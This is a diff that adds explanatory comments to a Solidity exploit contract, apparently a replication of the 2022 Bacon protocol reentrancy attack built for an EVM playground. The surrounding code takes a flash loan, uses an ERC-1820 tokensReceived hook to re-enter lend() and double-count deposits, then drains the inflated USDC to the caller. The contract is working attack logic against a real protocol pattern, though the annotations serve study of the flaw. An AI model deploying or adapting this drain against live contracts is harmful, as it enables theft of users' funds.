@@ -3,6 +3,10 @@ pragma solidity >=0.7.0 <0.9.0;
 
 // Synthetic standalone exploit for the EVM Playground (2022-03-Bacon).
 //
+// VULNERABILITY: Reentrancy via ERC1820 tokensReceived during Bacon lend() (CEI + missing guard)
+// See detailed analysis, root cause, impact, and EXPLOIT STEPS in the comments of test/Bacon_exp.sol
+// (and embedded below). This file replicates the same vulnerable call pattern.
+//
 // The DeFiHackLabs PoC (test/Bacon_exp.sol) runs the whole attack INLINE in the
 // Foundry test contract `ContractTest`: the constructor registers the test as its
 // own ERC-1820 `tokensReceived` implementer, `test()` kicks off a UniswapV2 flash
@@ -55,6 +59,8 @@ contract BaconDrain {
     uint256 count = 0;
 
     constructor() {
+        // VULNERABILITY REGISTRATION: sets up the receiver for the hook that Bacon will invoke
+        // on us (via its ERC777 share mint inside lend). See full details in Bacon_exp.sol.
         // Register `address(this)` as the implementer for the ERC-1820
         // `tokensReceived` hook (keccak256("AmplyTokensRecipient")). When USDC is
         // transferred INTO the bacon pool during lend(), this hook fires on us and
@@ -75,8 +81,10 @@ contract BaconDrain {
     function uniswapV2Call(address sender, uint256 amount0, uint256 amount1, bytes calldata data) public {
         USDC.approve(address(BACON), 10_000_000_000_000_000_000);
 
+        // VULNERABILITY: [Reentrancy in lend via ERC1820 hook before share credit]
         // First lend() transfers USDC into the pool — the ERC-1820 tokensReceived
         // hook re-enters lend() twice more inside this call.
+        // (Detailed analysis in Bacon_exp.sol + comments above.)
         BACON.lend(2_120_000_000_000);
 
         // Pull out far more USDC than was deposited (accounting was inflated by the
@@ -92,8 +100,11 @@ contract BaconDrain {
         USDC.transfer(tx.origin, USDC.balanceOf(address(this)));
     }
 
+    // VULNERABILITY: [tokensReceived reentrancy enabler]
     // The reentrancy: fires during lend()'s USDC transfer (before accounting
-    // settles). Re-enters lend() twice to double-count the deposit.
+    // settles) OR during the ERC777 share _mint inside lend (balance update then _callTokensReceived).
+    // Re-enters lend() twice to double-count the deposit.
+    // See full VULNERABILITY block + EXPLOIT STEPS at top of file and in Bacon_exp.sol.
     function tokensReceived(
         address operator,
         address from,
